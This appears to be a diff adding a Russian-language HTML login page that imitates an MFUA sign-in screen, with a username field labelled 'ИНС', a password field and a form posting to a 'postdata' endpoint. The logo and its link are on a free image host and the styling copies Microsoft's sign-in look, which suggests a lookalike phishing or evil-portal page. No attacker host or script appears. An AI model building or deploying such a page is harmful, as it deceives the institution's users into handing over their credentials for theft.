@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Вход</title>
+    <style>
+        body {
+            margin: 0;
+            height: 100vh;
+            background-image: url('https://mir-s3-cdn-cf.behance.net/projects/max_808/3e9b8f59797887.Y3JvcCwxMzg0LDEwODMsMCww.jpg');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            font-size: 0.9em;
+            color: #000000;
+            font-weight: normal;
+            font-family: "Segoe UI Webfont", -apple-system, "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+        }
+
+        #content {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: #fff;
+            min-height: 26px;
+            min-width: 320px;
+            max-width: 412px;
+            padding: 32px;
+            box-shadow: 0px 0px 10px rgb(0 0 0 / 10%);
+            border: 1px solid #c4c8cc;
+            border-radius: 12px;
+            text-align: center;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            background-color: #f9f9f9;
+            font-size: 1em; /* Увеличен размер шрифта */
+            color: #000; /* Цвет текста */
+        }
+
+        input[type="text"]::placeholder,
+        input[type="password"]::placeholder {
+            color: #666464;
+            opacity: 1;
+            font-size: 1em; /* Увеличен размер шрифта для placeholder */
+        }
+
+        .button-container {
+            text-align: right;
+            margin-top: 10px;
+        }
+
+        button {
+            padding: 10px;
+            width: 120px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #0056b3;
+        }
+
+        .logoImage {
+            width: 65%; /* Уменьшена ширина логотипа до 65% */
+            height: auto;
+            margin-bottom: 20px;
+            display: block; /* Позволяет применять отступы */
+            margin-left: 0; /* Центрирование логотипа */
+            margin-right: auto; /* Центрирование логотипа */
+        }
+    </style>
+</head>
+<body>
+    <div id="content">
+        <a href="https://iimg.su/i/tqreB">
+            <img class="logoImage" id="companyLogo" src="https://s.iimg.su/s/26/v9QXS4FJhyFmX8hl41tQ1lTUGplFJvLklHb6SaTk.png" alt="MFUA">
+        </a>
+        <form action="postdata" method="post">
+            <input type="text" id="username" name="username" placeholder="ИНС" required>
+            <input type="password" id="password" name="password" placeholder="Пароль" required>
+            <div class="button-container">
+                <button type="submit">Войти</button>
+            </div>
+        </form>
+    </div>
+</body>
+</html>
